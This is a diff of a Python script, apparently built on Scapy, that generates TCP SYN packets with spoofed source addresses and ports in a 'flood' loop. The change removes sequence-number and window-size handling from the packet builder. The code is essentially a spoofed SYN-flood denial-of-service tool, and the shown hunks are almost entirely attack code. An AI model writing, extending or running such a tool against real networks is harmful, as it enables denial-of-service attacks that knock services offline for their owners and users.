@@ -5,7 +5,7 @@ from faker import Faker
 
 fake = Faker()
 
-def atk(target, size, seq):
+def atk(target, size):
 
     ip = IP()
     tcp = TCP()
@@ -19,29 +19,20 @@ def atk(target, size, seq):
     ip.src = spoof
     tcp.sport = spoofport
     tcp.flags = 'S'
-    tcp.window = 8
-    tcp.seq = seq
     packet = ip / tcp / payload
     return packet
 
 def flood(dest, size, num_packets):
-    # these are just values I pulled out of my ass but its ok cuz its just sequence stuff
-    counter = random.randint(6,91)
-    ceiling = random.randint(100, 9001)
     pkts = []
 
     proctime = time.process_time()
 
     print(f'making {num_packets} packets...')
     for i in range(0, num_packets+1):
-        pkt = atk(dest, size, counter)
-        counter += 1
+        pkt = atk(dest, size)
         pkts.append(pkt)
 
         print(str(round((i/num_packets)*100,2))+" %" +" done...", end='\r')
-
-        if counter == ceiling:
-            counter = random.randint(0,91)
 
     proctime = time.process_time()-proctime
     print(f'Done in {proctime} sec')
